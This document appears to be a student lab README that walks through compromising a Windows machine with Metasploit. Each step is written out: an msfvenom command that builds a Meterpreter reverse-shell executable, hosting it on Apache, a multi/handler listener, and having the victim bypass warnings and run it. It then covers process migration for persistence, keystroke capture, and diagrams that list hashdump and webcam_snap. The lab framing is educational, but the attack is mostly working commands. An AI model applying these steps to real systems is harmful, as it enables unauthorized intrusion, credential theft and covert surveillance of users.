# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

### PROGRAM:

Find the attackers ip address using ifconfig

### Output:

![image](https://github.com/user-attachments/assets/b98e3dbe-cbf4-465e-83aa-f1ac913b2a51)

Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:

![image](https://github.com/user-attachments/assets/094f111d-38e4-47a4-b950-8c0544a3463e)

copy the fun.exe into the apache ```/var/www/html ```folder

![image](https://github.com/user-attachments/assets/1a19f712-d904-4e9a-9c3f-a0f824215d01)

Start apache server ```sudo systemctl apache2 start``` 

![image](https://github.com/user-attachments/assets/2944d067-02b2-43fc-9487-5f9e71c393b7)

Check the status of apache2 ```sudo apache2 status```

![image](https://github.com/user-attachments/assets/1577dcc8-8e32-4080-8459-521367056dc0)

Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 
![image](https://github.com/user-attachments/assets/d6bd1bdb-3064-45e8-b6b1-e22d2e80209f)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.

![image](https://github.com/user-attachments/assets/7be60e9f-2ce3-487a-9668-8bdb282e8931)

Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit

![image](https://github.com/user-attachments/assets/596d3916-66f9-4605-8ae4-5dd21116b77a)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/user-attachments/assets/d53176fa-7af0-4f05-b526-91713074335d)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/user-attachments/assets/ec7c391d-62a6-4fdc-a2c3-ef383b6c8a57)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.



## arcg

```bash
+----------------+                           +------------------+
|                |      Reverse Shell        |                  |
| Attacker       | <-------------------------|   Victim (Win)   |
| (Kali Linux)   |       (TCP 4444)          |  Unpatched SMB   |
|  - msfconsole  |                           |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        | Payload generation using msfvenom           |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload
         LHOST=attacker_ip LPORT=4444               or exploit triggers
         -f exe > evil.exe

        |
        | Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     Meterpreter Session Established (shell access)         |
+------------------------------------------------------------+
| Commands: sysinfo, hashdump, migrate, webcam_snap, etc.    |
+------------------------------------------------------------+

```

## 2

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
